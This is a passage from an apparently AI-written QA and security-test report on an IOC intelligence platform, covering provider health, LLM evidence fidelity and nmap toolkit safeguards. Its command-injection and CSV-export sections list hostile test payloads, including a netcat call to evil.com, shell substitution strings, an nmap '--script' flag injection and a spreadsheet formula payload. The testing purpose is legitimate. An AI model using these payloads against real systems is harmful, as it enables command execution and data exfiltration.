Impact is currently low: I checked the frontend and the only consumer of GET /providers/health (frontend/app/lookup/new/page.tsx) only reads `supported_types`, never `.configured`; the admin Providers page's 'Configured/Not configured' badge (components/dashboard/ProviderConfigRow.tsx) is fed by the separate, correct /runtime/ioc-providers endpoint. So no user-facing surface renders the wrong value today, but any future consumer of GET /providers/health's `configured` field (or an external integration trusting this documented API) would get misleading data. | GET /api/v1/providers/health (live, as qa-ent-chaos analyst) returned configured=false for virustotal, abuseipdb, otx, urlhaus, threatfox, malwarebazaar, hybrid_analysis, censys. The SAME live investigation's provider_result stream shows virustotal and abuseipdb were actually attempted (got real 401s from the live third-party APIs) and otx was actually attempted (got no_data) -- all three requiring requires_key=True and only reachable past the NOT_CONFIGURED short-circuit in app/providers/base.py's run() if effective_configured was True via the runtime override. Read-only DB query of provider_runtime_configs (kind='IOC') shows last_test_ok=true/'Connected. Key is valid.' for virustotal (tested 2026-08-14 02:18:22), otx (2026-08-14 02:34:45), and hybrid_analysis (2026-08-14 04:50:42), i.e. a runtime credential row exists and was validated for these, independent of the stale process-level Settings flag. Frontend grep confirmed only components/dashboard/ProviderConfigRow.tsx and AiQuickSwitch.tsx read `.configured` in the UI, both backed by /runtime/ioc-providers not /providers/health. | As any authenticated user with lookup:read, GET /api/v1/providers/health and compare its `configured` field for virustotal/abuseipdb/otx against GET /api/v1/runtime/ioc-providers's `configured` field for the same provider_ids (admin-only, provider:manage) -- the two endpoints disagree. |
| info | virustotal and abuseipdb credentials are currently invalid against the live third-party APIs (real, not simulated) | Independent of any test harness, the runtime-stored credentials for virustotal and abuseipdb are presently rejected by the real VirusTotal and AbuseIPDB APIs with HTTP 401 Unauthorized on every investigation that includes an IP/domain/hash IOC type, burning one real outbound call per investigation for no benefit. This is a live operational issue for the operator to address (rotate/re-enter the keys), reported here only because it's the natural real-world instance of 'provider failure' this dimension asked me to observe -- not something I induced. | Live 401 responses captured during my own test run (see finding above); provider_runtime_configs.last_test_message for abuseipdb reads 'Authentication failed -- check your API key.' (tested 2026-08-13 01:47:16), consistent with a currently-invalid stored key rather than a transient network blip. | Run any IOC lookup of type ipv4/ipv6/domain/hash and observe virustotal and abuseipdb provider_result rows come back status=error with a 401 in error_message. |
| info | NOT TESTED / environment note: could not induce a fresh timeout or confirm the un-awaited-`result` code path in orchestrator.py | app/providers/orchestrator.py's _run_with_policy() has an exception branch structure where `result` is only assigned inside the `except asyncio.TimeoutError` and `except _RETRYABLE_EXC` branches (plus the AsyncRetrying success path) -- I read this carefully but did not find a live or historical case of a provider raising a non-retryable, non-HTTPStatusError exception at the orchestrator layer (BaseProvider.run()'s own catch-all `except Exception` already normalizes everything from fetch() into a ProviderResult before it reaches the orchestrator, so this theoretical gap in _run_with_policy is very likely unreachable in practice). I did not attempt to fabricate such a path (e.g. by monkeypatching a provider) since the instructions scoped this to observation of real behavior, not code mutation. Flagging as a code-reading note only, not a confirmed defect. | app/providers/orchestrator.py lines ~52-80: the try/AsyncRetrying block only defines `result` on the TimeoutError and _RETRYABLE_EXC except branches; a provider.run() call raising some other exception type would propagate un-caught out of _run_with_policy, to be caught by run_all_providers()'s `except Exception` in the as_completed loop (which logs and drops that provider's result rather than yielding an ERROR ProviderResult for it) -- but BaseProvider.run() itself already catches Exception broadly, so in practice every real connector's failure is normalized before it can reach this path. | NOT TESTED -- ENVIRONMENT LIMITATION: would require monkeypatching a provider's fetch() to raise a non-httpx exception without going through BaseProvider.run()'s own catch-all, which is not a realistic live-traffic scenario and wasn't attempted. |
| info | Housekeeping note: a different qa-ent-chaos-* user was found mid-run, not created or deleted by me | While verifying my own cleanup, a second user matching the same qa-ent-chaos-* naming convention (id 92647808-050f-44da-bf12-82340cb6ba61, email qa-ent-chaos-6e19d35b@qa.test, created 2026-08-15 10:36:36) was found in the users table -- not the one I created (mine was id 5fdd6f1f-5da0-4760-b4a3-9a9d0e75296f / qa-ent-chaos-125bba29@qa.test, which I successfully deleted along with its lookup). This other row is almost certainly from a concurrently-running QA agent/dimension using the same naming convention. Per instructions against broad pattern-matched deletes, I left it alone. | psql: SELECT id,email,created_at FROM users WHERE email LIKE 'qa-ent-chaos-%' returned only 92647808-050f-44da-bf12-82340cb6ba61 / qa-ent-chaos-6e19d35b@qa.test after my own cleanup ran (confirmed my own id 5fdd6f1f-... returns 0 rows). | N/A -- informational, no action taken. |

### 10. AI hallucination/evidence-fidelity defense

**Summary:**

Confirmed the live AI backend is ollama/gemma2:2b (is_active=True, configured=True) via `runtime_config.list_ai_providers()`. Created a fresh disposable analyst user (qa-ent-halluc@qa.test) with `create_user`, minted a JWT in-process via `create_access_token(subject=..., role='analyst', token_version=0)` (never printed), and ran three independent POST /api/v1/lookup/stream investigations against the live backend: 8.8.8.8 (benign), 199.212.57.95 (OTX threat-actor/campaign attribution), and hash 2201104c6a6b96a0c44738a7c6b6c4d1e0a6c1b5a6c5849d7dc6fc1131d46c1f (mostly not_configured providers, one OTX hit). Captured full SSE streams (8,989 / 760,693 / 6,069 bytes respectively), parsed every event, and manually diffed each final_assessment's executive_summary/technical_summary/threat_assessment/verdict_rationale/risk fields against the provider_result/provider_summary/correlation events earlier in the same stream. Also read app/ai/service.py and app/ai/schemas.py in the running container to determine which fields are LLM-authored vs code-derived and what validation (if any) guards against self-contradiction, which let me distinguish "caught by existing guards" from "slipped through live." This is a fresh, independent run (new lookup_ids, new timestamps) distinct from the prior conversation's qwen2.5:0.5b/gemma2:2b comparison — gemma2:2b again produced no flatly invented entity names (no fake malware families, no fake threat actors) in these three runs, but did produce several concrete evidence-fidelity defects detailed below.

This is strong corroborating evidence that gemma2:2b-class models do hallucinate wholesale associations under zero-evidence conditions, but it is NOT independently re-reproduced in this session (our hash test case had one real OTX hit, so it never took this code path) -- reporting as NOT TESTED (LIVE) / confirmed via code reading only. | app/ai/service.py lines 394-410: "# Confirmed live with a genuinely severe bug: 44d88612fea8a8f36de82e1278abb02f (the EICAR test file's real MD5) hit four not_configured providers -- zero real data of any kind -- and the model still returned final_verdict=\"highly_malicious\" with malicious_probability=92, fabricating \"association with ransomware and trojans\" wholesale." | NOT TESTED -- ENVIRONMENT LIMITATION: reproducing this would require an IOC where every applicable provider is simultaneously not_configured/no_data (e.g. the actual EICAR MD5 44d88612fea8a8f36de82e1278abb02f), which was not one of the three cases assigned for this run; the assigned hash case had a real OTX hit so the empty-evidence short-circuit path was never exercised. |

### 11. Critical IOC classification tests

**Summary:**

Created a disposable analyst user (qa-ent-critical@qa.test, Role.ANALYST) via app.core.users.create_user directly inside app-backend-1 (confirmed: "CREATED qa-ent-critical@qa.test analyst"), then minted a JWT in-memory inside the container via app.auth.security.create_access_token(subject=..., role="analyst", token_version=0) and used httpx (also in-memory in the container, never printed) to POST http://localhost:8000/api/v1/lookup/stream for all five IOCs, capturing the full SSE event stream (detected -> provider_result/provider_summary pairs -> correlation -> final_assessment -> done) for each. All five returned HTTP 200 and completed to a final_assessment/done pair with no stream errors. I read backend logs (docker logs app-backend-1) to independently confirm one root cause (a malformed-JSON error from the local Ollama gemma2:2b model), and independently re-verified the RDAP claim for 203.0.113.77 by issuing a real RDAP lookup from inside the container, which genuinely 404s (confirming the platform's "no_data" for that provider was itself correct, not a bug). Verdicts obtained: 199.212.57.95 -> malicious (risk 87, malicious_probability 90) backed by real OTX threat-actor "SilverFox"/campaign data - defensible. 8.8.8.8 -> benign but with an internally incoherent risk_score of 60 and threat narrative that treats coincidental/irrelevant GitHub search hits as elevating risk. The hash -> malicious (risk 87, malicious_probability 100) backed by real OTX 'whack.sh' campaign data - defensible. CVE-2021-44228 -> malicious/critical (risk 90, CVSS 10.0 correctly surfaced from NVD) - but the CISA KEV provider's AI summary generation failed (confirmed via logs: the local model emitted truncated/invalid JSON), so the single most authoritative fact available (CISA KEV "known_ransomware_campaign_use": "Known", a live, overdue-since-2021 mandated remediation) never reached the final assessment's narrative/evidence, which is a real burying-of-evidence defect, not merely benign-looking noise. 203.0.113.77 -> confidently "benign" (confidence_score 80) despite zero real signal from any of the 7 applicable providers, when the task expects an unknown/no-data outcome for a TEST-NET-3 address with no data; the same final_assessment JSON also contains a corrupted recommended_actions list entry ("], "), a raw JSON-repair artifact leaking into structured output.

**Findings (5):**

| Severity | Title | Description | Evidence | Reproduction |
|---|---|---|---|---|
| P2 | Log4Shell's most authoritative evidence (CISA KEV known-ransomware-use) is silently dropped from the final assessment due to an AI summarization failure, not merely buried under noise | For CVE-2021-44228, provider cisa_kev returned real, correct structured data: {"verdict": "malicious", "vulnerability_name": "Apache Log4j2 Remote Code Execution Vulnerability", "known_ransomware_campaign_use": "Known", "due_date": "2021-12-24", ...}. But its AI-generated provider_summary came back as: {"provider_id": "cisa_kev", "what_it_knows": "AI summarization unavailable for this provider (generation error).", "reputation": "unknown", "detection_status": "unknown", "threat_level": "none", "confidence": "low", "caveats": "The AI backend failed to generate a summary for this provider's data (see server logs for details)."}. docker logs confirms the root cause: 'ERROR:app.ai.ollama_client:Ollama response was not valid JSON (model=gemma2:2b): ..."relationships": [\n    "CVE-2021-44228 is a known exploited vulnerability.", "],  }' followed by 'WARNING:app.ai.service:Provider summary generation failed for cisa_kev'. Because generate_final_assessment (app/api/routes/lookup.py) only receives provider_summaries (not raw provider_results), this generic placeholder is all the final-assessment step ever sees for cisa_kev. Consequently the final_assessment's supporting_evidence for CVE-2021-44228 cites only NVD ('NIST NVD has analyzed this vulnerability and found it to be malicious.') and unrelated GitHub OSINT hits -- it never mentions the CVSS score (10.0), the CVSS vector, or the CISA KEV ransomware/deadline facts anywhere in the narrative text, even though those exact facts are sitting untouched in provider_result.data for both nvd and cisa_kev. The numeric risk fields (severity=critical, risk=90) happen to land correctly this run because NVD's CVSS still came through, but the analyst-facing rationale is missing the single most operationally important fact (this is a KEV-listed, actively-ransomware-exploited vulnerability with a legally mandated remediation deadline that has been overdue for years) purely because of an LLM JSON-formatting glitch with no fallback that reconstructs a deterministic summary from the still-valid raw provider fields. | Full CISA KEV provider_summary event: {"provider_id": "cisa_kev", "what_it_knows": "AI summarization unavailable for this provider (generation error).", ...}. Backend log: "ERROR:app.ai.ollama_client:Ollama response was not valid JSON (model=gemma2:2b): ... \"relationships\": [\n    \"CVE-2021-44228 is a known exploited vulnerability.\", \"],  }\"". Fallback code confirmed at app/ai/service.py:365-375 (except Exception -> generic 'AI summarization unavailable' ProviderSummary with confidence='low'). | POST /api/v1/lookup/stream {"value": "CVE-2021-44228"} as an analyst-role JWT; read the SSE stream's provider_summary event for provider_id=cisa_kev, then compare against the final_assessment event's supporting_evidence/verdict_rationale fields -- the KEV ransomware/deadline facts are present in provider_result but absent from every AI-narrative field. |

### 12. Security Assessment Toolkit (Nmap/DNS/TLS/HTTP-header/vuln-intel/hash tools) -- safety-boundary verification and real-scan testing

**Summary:**

Re-read every file in backend/app/security_assessment/*.py, backend/app/core/security_assessment.py, and backend/app/api/routes/security_assessment.py fresh from the dev tree (confirmed byte-identical to the installed/running copy via diff) to re-verify the toolkit's hard safety constraints. Then, using a disposable qa-ent-* ANALYST persona (JWT minted via create_access_token against a real DB-backed user created via create_user, never a password), ran real HTTP requests against the live backend at http://localhost:8000/api/v1/security-assessment/* inside app-backend-1, covering every scenario requested: target-confirmation mismatch rejection, unconfirmed-authorization rejection, CIDR->/28 rejection (plus the /28 boundary-accept case), a real successful nmap scan against 127.0.0.1, tool-health's real shutil.which check (both live and via an in-process monkeypatch simulating nmap missing), and a battery of malformed/oversized/shell-metacharacter/control-character/newline targets. All test data (3 disposable users, 10 lookups, their runs/findings/AI-summary/correlation/evidence rows) was created and then fully cleaned up by exact ID (no pattern-matched deletes touching other dimensions' qa-ent-* data, which was left untouched). No secrets were printed at any point.

**Findings (3):**

| Severity | Title | Description | Evidence | Reproduction |
|---|---|---|---|---|
| P2 | Long (but fully legitimate, schema-valid) target string causes an unhandled 500 and a permanently orphaned PENDING run -- a real silent-failure path | backend/app/core/security_assessment.py's start_run() commits the SecurityAssessmentRun row (status=PENDING) FIRST, then calls record_audit() with an f-string that embeds the caller's target_confirmation verbatim with no length cap: `f"Requested a security assessment ({', '.join(tool_ids)}, profile={profile_id!r}) against '{target_confirmation}'."`. app/core/audit.py's record_audit() does no truncation either, and app/models/runtime_config.py's ConfigAuditLog.detail column is `String(1000)`. Because IOCLookup.ioc_value is `String(2048)` (and URL-type IOCs routinely exceed 900 characters with query strings/tokens), any legitimately-storable target longer than ~933 characters (67-char fixed prefix + 1000-char column) makes this INSERT raise `asyncpg.exceptions.StringDataRightTruncationError: value too long for type character varying(1000)`. This happens BEFORE `_spawn_background(_execute_run(...))` is ever reached, so: (1) the client gets a broken/empty non-200 response instead of a clean 4xx or 200, and (2) the SecurityAssessmentRun row that was already committed is left in PENDING forever -- it will never run, never complete, never fail, and never surface any error, directly contradicting the toolkit's own design principle of clean, visible pass/fail status and 'no silent failure'. This is reachable by any ANALYST/ADMIN with a normal long URL IOC, not just a contrived attack string. | Reproduced live: created IOCLookup ioc_value='a'*1900+'.example.test' (1913 chars, well under the 2048-char column cap), POSTed target_confirmation=<same string>, authorization_confirmed=true, tool_ids=['nmap']. docker logs app-backend-1 showed: `sqlalchemy.exc.DBAPIError: ... asyncpg.exceptions.StringDataRightTruncationError: value too long for type character varying(1000) [SQL: INSERT INTO config_audit_log (...) VALUES (... 'aaaa...(1682 characters truncated)...aaaa.example.test'.)]` at 2026-08-15T10:39:37Z, tied to lookup id 0bcb8ccf-79d8-4cca-8063-9409b669c1b6 and the disposable test user qa-ent-isosec-f323f3ec@qa.test. The client's httpx response object had a non-200 status with an empty body (raised JSONDecodeError: 'Expecting value: line 1 column 1' when parsed). The resulting SecurityAssessmentRun row was confirmed still present, in PENDING, referencing that user via requested_by (blocking even test-user hard-delete via FK) until manually cleaned up. | 1) Create an IOCLookup with ioc_type='domain'/'url' and ioc_value of length ~1000-2048 chars (e.g. 'a'*1900+'.example.test'). 2) POST /api/v1/security-assessment/{lookup_id}/run with {tool_ids:['nmap'], profile:'quick', target_confirmation:<same string>, authorization_confirmed:true} as any ANALYST/ADMIN. 3) Observe a non-200 response with an empty/unparseable body, and a SecurityAssessmentRun row stuck in PENDING indefinitely. |
| info | All re-verified hard safety constraints on the toolkit held under live testing -- no exploit execution, no shell injection, no evasion, no silent/unauthorized scanning | Fresh source read of nmap_tool.py/base.py/registry.py/security_assessment.py (service layer) confirmed: (a) every Nmap profile is a hardcoded argv list (no --script/-O/-sS/-sU/timing-evasion flags) invoked via asyncio.create_subprocess_exec with an explicit argument list, never create_subprocess_shell or string concatenation; (b) authorization_confirmed and exact target_confirmation-vs-lookup.ioc_value match are mandatory server-side checks in _validate_scope(), enforced before any DB row or background task is created; (c) CIDR targets are capped at /28 (16 addresses) via ipaddress.ip_network().num_addresses. Live testing confirmed every one of these behaviorally: target mismatch -> 400 'target_confirmation must exactly match...', zero run rows created; authorization_confirmed=false -> 400 'You must confirm you are authorized...'; CIDR /24 (256 addresses) -> 400 'Active scanning is limited to 16 addresses (/28)...'; CIDR exactly /28 -> accepted, real scan ran to completion. A real nmap 'quick' scan against 127.0.0.1 completed successfully (status=completed, 1 finding: 'Open port tcp/8000' matching the backend's own exposed port, no crash, no hang). GET /tool-health correctly reported nmap as available=true (real shutil.which check); an in-process-only monkeypatch of shutil.which to simulate nmap missing (never touching the live container) made is_available() return False and nmap_tool.run() return a clean ProviderStatus.ERROR result with error_message='nmap is not installed on this host.' -- never a silent failure. Six distinct malformed-target payloads (`;touch ...;`, backtick command substitution, `$(...)` subshell, `\|`/`>` pipe-redirect, control characters 0x01/0x07/0x1b, and CRLF/newline injection) were each run as real nmap targets end-to-end: every run completed cleanly (nmap failed to resolve the bogus hostname, 0 findings, no error), and a marker-file check (`ls /tmp/qa_pwned_marker*`) after all six confirmed zero shell-injection side effects occurred. Postgres itself independently rejected a null-byte IOC value (`CharacterNotInRepertoireError: invalid byte sequence for encoding "UTF8": 0x00`) and an over-2048-char IOC value (`StringDataRightTruncationError: value too long for type character varying(2048)`) at the DB-insert layer, before ever reaching the toolkit -- reasonable defense-in-depth, not a gap. | Full request/response/log evidence for every sub-case captured during testing (status codes, response bodies, docker logs, marker-file absence) -- see reproduction steps; none of these constitute a finding needing a fix, listed here as a confirmation of intact controls per the task's re-verification requirement. | — |
| not_tested | True multi-host HA failover / concurrent-chaos-testing crash attribution -- environment limitation | Early in this session, app-backend-1 was observed to fully restart (fresh 'Application startup complete' + alembic migration re-run, container uptime reset) once during a batched run of multiple malformed-target cases. This could NOT be reproduced when each malformed case was subsequently re-run in isolation with container-health checks before/after (all stayed healthy, uptime monotonically increasing, no restarts across 7 individual isolated re-runs including the exact long-hostname payload that triggered the audit-log bug above). A DB query for other qa-ent-* users revealed a concurrent, independent QA dimension actively creating users with prefix 'qa-ent-chaos-' at 10:36:36 and 10:38:50 -- squarely overlapping the unexplained restart window (~10:37-10:39). Given this is a shared, currently-running system with multiple QA subagents/dimensions testing concurrently, I cannot conclusively attribute that single restart to the Security Assessment Toolkit specifically, and it was not reproducible when isolated. Flagging as NOT TESTED / INCONCLUSIVE rather than claiming a confirmed toolkit-caused crash, per the instruction to never overclaim. | docker logs app-backend-1 showed a second 'INFO [alembic.runtime.migration]' + 'Started server process' + 'Uvicorn running' sequence appearing mid-stream with no crash traceback logged immediately before it; docker ps showed uptime reset from 'Up 7 hours' to 'Up 7 seconds' at that point. A subsequent psql query showed qa-ent-chaos-6e19d35b@qa.test (10:36:36) and qa-ent-chaos-125bba29@qa.test (10:38:50) created by a different, concurrently-running QA dimension in the same window. | Not independently reproducible in this session; would need exclusive access to the environment (no concurrent QA dimensions running) to isolate cause with confidence. |

### 13. Command injection testing — Security Assessment Toolkit subprocess-invoking code paths (IOC Intelligence Platform)

**Summary:**

Read every file in backend/app/security_assessment/ (nmap_tool.py, dns_tool.py, tls_tool.py, http_headers_tool.py, hash_tool.py, vuln_intel.py, base.py, registry.py) and grepped the entire backend/app tree for subprocess/os.system/shell=True/Popen usage — nmap_tool.py is the only code path in the whole backend that shells out; it uses asyncio.create_subprocess_exec with a literal, hardcoded argv list, target as one opaque argv element, never create_subprocess_shell/shell=True/string concatenation. Confirmed dev tree and installed/running Docker copy are byte-identical (diff empty). Then, using a disposable qa-ent-cmdinj@qa.test ANALYST persona (JWT minted via create_access_token, backed by a real disposable DB user row so RBAC's DB-backed get_current_user check passes) against the live app-backend-1 container, created 6 IOCLookup rows (ioc_type=ipv4) with ioc_value set to each of the 6 required injection payloads, then called the real POST /api/v1/security-assessment/{lookup_id}/run endpoint (target_confirmation=payload, tool_ids=["nmap"], profile="quick", authorization_confirmed=true) and polled to completion. Also ran the exact same argv shape nmap_tool.py builds directly (bypassing the API) to observe nmap's own parsing of each payload. All 6 API runs returned HTTP 200, completed with 0 findings, no crash. Verified `docker exec app-backend-1 test -f /tmp/qa_ent_pwned` was ABSENT before and after every test (direct and API paths). All disposable DB rows (lookup, run, findings, user, audit log) were cleaned up and verified via psql counts = 0 after the run.

**Findings (3):**

| Severity | Title | Description | Evidence | Reproduction |
|---|---|---|---|---|
| info | nmap_tool.py confirmed immune to OS command injection — argv-exec, no shell, target is one opaque token | backend/app/security_assessment/nmap_tool.py builds argv = ["nmap", "-oX", "-", *_PROFILE_ARGS[profile_id], target] and invokes it via `await asyncio.create_subprocess_exec(*argv, ...)`. There is no create_subprocess_shell, os.system, or shell=True anywhere in backend/app (grep -rniE across the whole app tree, excluding .venv, matched only this one asyncio.subprocess.PIPE line). Because create_subprocess_exec calls execve()-style with an explicit argv list, each Python list element becomes exactly one OS-level argv slot; a single string containing shell metacharacters (';', '&&', '$()', backticks, '\|') is never re-parsed by a shell and can never split into multiple commands or arguments. | All 6 required payloads run with the tool's exact argv shape (either directly or through the live HTTP API as target_confirmation on a real IOCLookup, using a disposable qa-ent-cmdinj@qa.test analyst persona): '127.0.0.1; touch /tmp/qa_ent_pwned' -> nmap stderr 'Unable to split netmask from target expression...WARNING: No targets were specified, so 0 hosts scanned.' rc=0. '127.0.0.1 && whoami', '$(whoami)', '`id`', '127.0.0.1\|nc evil.com 4444' -> all produced 'Failed to resolve "<literal string>".' / 'No targets were specified, so 0 hosts scanned.' rc=0 -- i.e. nmap tried (and failed) to DNS-resolve the entire literal string as one hostname; whoami/id were never executed, no connection to evil.com was attempted. Via the real API (POST /api/v1/security-assessment/{lookup_id}/run with these exact strings as target_confirmation, HTTP 200, run status ended 'completed', findings_count=0 for every payload), and independently via docker exec, `test -f /tmp/qa_ent_pwned` was ABSENT both before and after every test run. | Mint a JWT for a real disposable ANALYST-role DB user (app.auth.security.create_access_token(email, 'analyst') plus a matching app.core.users.create_user row, since get_current_user in app/auth/rbac.py does a DB lookup by email/token_version). Insert an IOCLookup row with ioc_type='ipv4' and ioc_value=<payload>. POST /api/v1/security-assessment/{lookup_id}/run with json={"tool_ids":["nmap"],"profile":"quick","target_confirmation":<payload>,"authorization_confirmed":true}. Poll GET /api/v1/security-assessment/runs/{run_id}. Confirm via `docker exec app-backend-1 test -f /tmp/qa_ent_pwned` that no side effect occurred. |
| P4 | Single-argv-slot argument injection into nmap's own flag parser is possible but not exploitable given the current fixed argv shape | nmap_tool.py's docstring explicitly states no profile ever includes `--script` (NSE = arbitrary code execution risk) or other intrusive flags, and that the target is 'one argv element, passed to the subprocess API directly.' That second claim is true, but it does not fully close the door on nmap's OWN CLI parser (independent of any shell) treating the target string as a flag rather than a hostname if it happens to start with '-'/'--' -- nmap does its own argv parsing (like any CLI tool) and does not know 'this argv slot is supposed to be a target only'. Tested with target_confirmation = '--script=vuln 127.0.0.1' (one of the 6 required payloads): nmap's NSE engine parsed this as the flag `--script` with value `vuln 127.0.0.1`, attempted to resolve that as a script category, and failed ('did not match a category, filename, or directory'), rc=1, no scan performed, no findings. Separately (outside the required payload list, added to close the loop) target='--script=vuln' alone (a real, valid NSE category name) WAS accepted by nmap's parser as a legitimate flag with no error -- but because it consumed the tool's single attacker-controlled argv slot, there was no target argv element left, so nmap reported 'WARNING: No targets were specified, so 0 hosts scanned.' (rc=0) and never loaded/ran any script against any host. Because nmap_tool.py's argv always places the attacker-controlled value as the single LAST list element (`[..., *_PROFILE_ARGS[profile_id], target]`), a single Python string can occupy only one OS-level argv slot -- there is no way for a single string (however many spaces it contains) to become two separate positional argv entries the way it would if the code used a shell. So this class of bug cannot currently be leveraged to both inject a flag AND supply a real target in the same request; it is a real gap relative to the code's own stated invariant ('no profile includes --script'), but not an exploitable one today. Recommended hardening (defense-in-depth, not urgent): reject/normalize target values starting with '-' before building argv, or insert a literal '--' end-of-options separator immediately before the target element. | Direct argv-shape test: argv=['nmap','-oX','-','-T4','-F','--top-ports','100','--script=vuln 127.0.0.1'] -> stderr: "NSE: failed to initialize the script engine:\n.../nse_main.lua:829: 'vuln 127.0.0.1' did not match a category, filename, or directory", rc=1. Follow-up: argv=[...,'--script=vuln'] (no trailing target) -> stderr: 'WARNING: No targets were specified, so 0 hosts scanned.', rc=0. Same behavior reproduced through the live API for the '--script=vuln 127.0.0.1' payload (HTTP 200, run completed, 0 findings). | docker exec app-backend-1 python3 -c with argv=['nmap','-oX','-','-T4','-F','--top-ports','100','--script=vuln']; observe nmap accepts the flag but reports no targets scanned. Not independently reachable as a full exploit because the tool's argv construction leaves exactly one attacker-controlled slot, always in the terminal target position. |
| P3 | Lookup creation lets a caller assign an arbitrary IOCType label to an arbitrary/unvalidated string via ioc_type_hint, which is the actual mechanism by which a non-IP string can reach nmap_tool.py's target parameter as a scannable IPV4 target | This is not a command-injection bug (nmap_tool.py's argv-exec handling is safe as shown above) but it is the realistic path by which an attacker-controlled, non-IP-shaped string ends up seeded as target for the Nmap/TLS/DNS/HTTP-header tools in the first place. app/api/routes/lookup.py's POST /lookup/stream computes `ioc_type = payload.ioc_type_hint or detect_ioc_type(ioc_value)` -- if the caller supplies `ioc_type_hint`, detect_ioc_type() (and all its format regexes/ipaddress.ip_address() parsing) is skipped entirely, and the raw string is stored as IOCLookup.ioc_value with whatever ioc_type the caller asked for. app/core/security_assessment.py's _validate_scope() then only checks `lookup.ioc_type in SCANNABLE_TYPES` and (for CIDR only) parses lookup.ioc_value with ipaddress.ip_network -- for IPV4/IPV6/DOMAIN/HOSTNAME it never re-validates that ioc_value is actually shaped like an IP/hostname before treating it as a valid nmap/tls/dns/http-headers target. So a caller with only lookup:create (any ANALYST/ADMIN role) can create a lookup with ioc_value='anything they want' and ioc_type_hint='ipv4', then (separately, with security_assessment:create) request a scan against it with target_confirmation equal to that same arbitrary string. Confirmed via source review of app/api/routes/lookup.py line 81 and app/core/security_assessment.py line 113-130; not separately re-exercised through the live /lookup/stream HTTP endpoint in this pass to avoid triggering real external threat-intel provider calls for six garbage strings (out of scope/cost concern for this dimension) -- the equivalent DB state (IOCLookup with ioc_type='ipv4' and an arbitrary ioc_value) was instead created directly, which is exactly the state /lookup/stream + ioc_type_hint would produce, and was itself the object of every test above. | app/api/routes/lookup.py:81 `ioc_type = payload.ioc_type_hint or detect_ioc_type(ioc_value)` with no re-validation against the hint; app/schemas/lookup.py:11 `ioc_type_hint: Optional[IOCType] = None` (any enum value, unconstrained relative to `value`); app/core/security_assessment.py:113-130 `_validate_scope()` never calls ipaddress.ip_address()/hostname-format validation for IPV4/IPV6/DOMAIN/HOSTNAME types, only for CIDR. | POST /api/v1/lookup/stream with json={"value": "<arbitrary string>", "ioc_type_hint": "ipv4"} as any lookup:create-permitted user; inspect the resulting IOCLookup row's ioc_type/ioc_value. NOT independently executed against the live provider fan-out in this pass -- inferred from source and from the equivalent DB state used in the tests above. |

### 14. File security (server-side export / path-traversal surface)

**Summary:**

Tested whether documented "NOT IMPLEMENTED" PDF/CSV export is still true by reading current source (dev tree C:\Users\User\ioc-intel-platform and installed/running copy C:\Program Files\IOC Intelligence Platform\app, confirmed byte-identical for this file, and confirmed the running app-backend-1 container serves this code) and by calling POST /api/v1/lookup/{id}/export directly with minted analyst/viewer JWTs against the live backend at localhost:8000. Grepped the entire backend (excluding tests) for open(/Path(/os.path.join(/tempfile/UploadFile/StaticFiles/FileResponse to find every filesystem operation reachable from request data. Created disposable qa-ent-*/@qa.test lookups to prove out two content-injection bugs in the export renderers and a permission-enforcement gap, then cleaned up all test rows (verified 0 remaining) per the FinalAssessmentRecord-first delete pattern.

**Findings (5):**

| Severity | Title | Description | Evidence | Reproduction |
|---|---|---|---|---|
| info | docs/DOCUMENTATION_GAPS.md and docs/API_DOCUMENTATION.md are stale: server-side PDF/CSV export IS now implemented and live | Both docs state PDF/CSV export via POST /api/v1/lookup/{id}/export 'NOT IMPLEMENTED' / '404s always'. That is no longer true. backend/app/api/routes/lookup.py now defines `_render_csv()`, `_render_pdf()` (using reportlab==4.2.5, present in requirements.txt) and `@router.post('/{lookup_id}/export')`, identical in the dev tree and the installed tree that Docker actually runs (docker inspect app-backend-1 confirms working_dir = installed copy; grep inside the container at /app/app/api/routes/lookup.py shows the same code). A regression test file (backend/app/tests/unit/test_lookup_export.py) exists specifically because this gap was found and fixed previously. | Live call: POST /api/v1/lookup/{id}/export?format=csv and format=pdf both returned HTTP 200 with real content (PDF bytes started with b'%PDF'), not 404. docs/API_DOCUMENTATION.md:399-425 and :838 still say NOT IMPLEMENTED; docs/DOCUMENTATION_GAPS.md section 2 says the same. | Mint an analyst JWT via app.auth.security.create_access_token inside app-backend-1, GET /api/v1/lookup?limit=1 to get an id, POST /api/v1/lookup/{id}/export?format=csv (and format=pdf) with that token -> 200, not 404. |
| P2 | CSV export writes raw, unescaped IOC values into cells -- CSV/formula injection (CWE-1236) | _render_csv() (backend/app/api/routes/lookup.py:476-496) writes `lookup.ioc_value` and other fields verbatim into CSV cells via csv.writer with no neutralization of a leading =, +, -, or @. LookupCreateRequest.value (backend/app/schemas/lookup.py) has no character restriction, and free-text IOC types (malware_family, threat_actor, campaign, etc.) accept arbitrary strings via `ioc_type_hint`, so any analyst/admin can create a lookup whose 'ioc_value' is a formula payload. When another analyst exports that lookup to CSV and opens it in Excel/LibreOffice, the leading '=' is interpreted as a formula (classic DDE/formula-injection vector, e.g. exfiltration via WEBSERVICE()/HYPERLINK() or, on older Excel configs with DDE enabled, command execution). | Created a disposable lookup via POST /api/v1/lookup/stream with {"value": "=1+1+cmd\|calc!A1", "ioc_type_hint": "malware_family"} as qa-ent-analyst-a@qa.test. Exported CSV (200 OK) contained verbatim: `ioc_value,=1+1+cmd\|calc!A1` with no quoting/escaping/leading-apostrophe neutralization. Test lookup (id 45545891-1ada-4839-9faf-f1f6d916db3a) deleted after test; verified 0 rows remain. | 1) POST /api/v1/lookup/stream {value:'=1+1+cmd\|calc!A1', ioc_type_hint:'malware_family'} as any analyst -> get lookup_id. 2) POST /api/v1/lookup/{lookup_id}/export?format=csv -> response body's second line is 'ioc_value,=1+1+cmd\|calc!A1' unescaped. |
